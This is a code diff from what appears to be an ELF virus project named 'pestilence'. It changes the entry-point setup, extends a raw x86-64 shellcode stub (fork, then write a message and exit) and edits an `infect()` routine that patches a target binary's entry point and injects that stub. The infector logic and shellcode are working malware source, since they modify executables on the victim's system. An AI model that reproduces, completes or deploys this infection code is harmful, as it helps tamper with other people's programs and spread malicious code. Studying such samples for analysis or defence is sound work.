@@ -33,14 +33,14 @@
 */
 
 #include "pestilence.h"
-#ifndef FRENZY
-#define FRENZY 0
+#ifndef BEGIN
+#define BEGIN 0
 #endif
-#ifndef VARAX
-#define VARAX 0
+#ifndef END
+#define END 0
 #endif
-#ifndef CYANURE
-#define CYANURE 0
+#ifndef PROUT
+#define PROUT 0
 #endif
 void _start(void)
 {
@@ -50,9 +50,9 @@ void _start(void)
 		proc_terminate(0);
 
 	__asm__ volatile("lea (%%rip), %0\n"
-					 "cyanure:"
+					 "prout:"
 					 : "=r"(begin_ptr));
-	begin_ptr += FRENZY - CYANURE;
+	begin_ptr += BEGIN - PROUT;
 
 	fs_release(1);
 	fs_release(2);
@@ -270,7 +270,9 @@ clean:
 #define inout
 #define CURARE                                                                 \
 	"\xf3\x0f\x1e\xfa\x50\xb8\x39\x00\x00\x00\x0f\x05\x48\x85\xc0\x74\x06\x58" \
-	"\xe9\xe9\xff\xff\xff"
+	"\xe9\xe9\xff\xff\xff\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x35" \
+	"\x13\x00\x00\x00\xba\x0a\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00" \
+	"\x00\x00\x00\x0f\x05\x68\x65\x68\x65\x68\x65\x68\x65\x0a\x00"
 #define FLOWER (sizeof(CURARE) - 1)
 #define ACONIT 19
 
@@ -368,8 +370,6 @@ void infect(char *path, void *begin_ptr)
 		= pestis + elf.header->e_phnum * elf.header->e_phentsize;
 	delta -= elf.header->e_entry + ACONIT + 4;
 	memcpy(file_data + append_pos + ACONIT, &delta, 4);
-	append_pos += FLOWER;
-	memcpy(file_data + append_pos, begin_ptr, VARAX);
 clean:
 	vm_flush(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE, MS_SYNC);
 	vm_release(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE);
